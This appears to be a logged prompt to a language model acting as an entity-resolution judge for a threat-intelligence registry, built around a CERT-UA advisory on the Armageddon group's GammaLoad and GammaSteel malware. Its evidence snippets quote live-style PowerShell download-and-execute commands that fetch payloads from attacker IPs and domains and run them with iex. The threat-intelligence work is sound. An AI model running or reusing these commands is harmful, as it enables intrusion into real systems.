=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
E3. GraphSteel
E4. GammaLoad.PS1_v2
E5. stage1.ps1
E6. z.ps1
E7. stage2.ps1
E8. POWERGAP
E9. OUTSTEEL
E10. microsoft-cortana.exe
E11. .NET Framework
E12. MarsStealer
E13. GrimPlant
E14. RelicRace
E15. Internet Explorer
E16. JesterStealer
E17. FTPGetter
E18. Formbook/XLoader v2.5
E19. Hashcat
E20. needrestart
E21. Meterpreter
E22. Formbook
E23. DarkCrystal RAT
E24. PowerShell [aka powershell.exe]
E25. 223329.exe
E26. 62ea.exe
E27. SPECTR.Shell
E28. cmd.exe
E29. 966449.exe
E30. MS PowerPoint
E31. GammaSteel.NET
E32. HarvesterX
E33. PowerShell (powershell.exe)
E34. GammaSteel.PS1
E35. co87972.tmweb.ru
E36. acteran.ru
E37. bilitora.ru
E38. a0695487.xsph.ru
E39. apoxipodes.ru
E40. fishitor.ru
E41. a0322810.xsph.ru
E42. tiloraso.ru
E43. a0698649.xsph.ru
E44. billyhot.ru
E45. dodortar.ru
E46. candidar.ru
E47. lnk-upload.dodortar.ru
E48. motocheck.in
E49. stormpredictor.host
E50. varanasiclick.ru
E51. nikotod.ru
E52. mulleti.ru
E53. meteolink.host
E54. erwini.ru
E55. successilin.top
E56. a0656203.xsph.ru
E57. ryomy.ru
E58. bul-opros.top
E59. a0698262.xsph.ru
E60. iol.pt
E61. toknowall.com
E62. gopoppers.com
E63. kopratiso.ru
E64. podologaneri.it
E65. districoperav.icu
E66. potrakit.ru
E67. giraffe-tour.ru
E68. rivierafamily.com
E69. nitikora.ru
E70. omyce.ru
E71. tridiuma.ru
E72. yandex.ru
E73. leonardis.ru
E74. olei.ro
E75. s8.h.mchost.ru
E76. jevejosader.top
E77. enlamentedeunasesor.com
E78. emterox.ru
E79. milotrad.ru
E80. milotraf.ru
E81. aspe.ro
E82. tortunas.ru
E83. pastebin.com
E84. jokotras.ru
E85. afi-opros.top
E86. mitraseo.hol.es
E87. parodadoca.ru
E88. marmaris.com.ua
E89. xsph.ru
E90. nx0.ru
E91. ncscc.gov.ua
E92. www.msftncsi.com
E93. staystrongjewels.com
E94. wi-opros.top
E95. xcasinobonuses.net
E96. viewdns.net
E97. servebeer.com
E98. evil.server.com
E99. 3utilities.com
E100. ns2-dns.com
E101. agreminj.com
E102. ns.ns2-dns.com
E103. airmauritiusticket.com
E104. ns3-dns.com
E105. ftp.thefoodplace.net
E106. bounceme.net
E107. ddns.net
E108. mail.nais-gov.org
E109. plexbd.net
E110. sytes.net
E111. brunoboys.net
E112. alt-2cdn.net
E113. dcshost.net
E114. gov-ua.info
E115. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E116. dyndns.com
E117. ns.ns3-dns.com
E118. cloudflare-dns.com
E119. servecounterstrike.com
E120. www.facebook.com
E121. ddnsking.com
E122. www.michiganmastereltiempo.com
E123. www.symantec.com
E124. servehttp.com
E125. atlantar.ru
E126. motoristo.ru
E127. moolin.ru
E128. bubenci.ru
E129. callsol.ru
E130. clipperso.ru
E131. cooperi.ru
E132. detroito.ru
E133. farafauler.ru
E134. flayga.ru
E135. ganara.ru
E136. hawksi.ru
E137. hofsteder.ru
E138. kilitro.ru
E139. kurapat.ru
E140. lnasfe.ru
E141. lopasts.ru
E142. mafirti.ru
E143. metanat.ru
E144. mitlubald.ru
E145. paparat.ru
E146. pasamart.ru
E147. qkcew.ru
E148. rncsq.ru
E149. tarlit.ru
E150. tbwelo.ru
E151. wicksl.ru
E152. xcqef.ru
E153. nxkad.ru
E154. dnslookup.seowebchecker.com
E155. tools.nexcess.net
E156. viewdns.info
E157. www.portcheckers.com
E158. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E1, E11, E3, E4 — ctx: S1
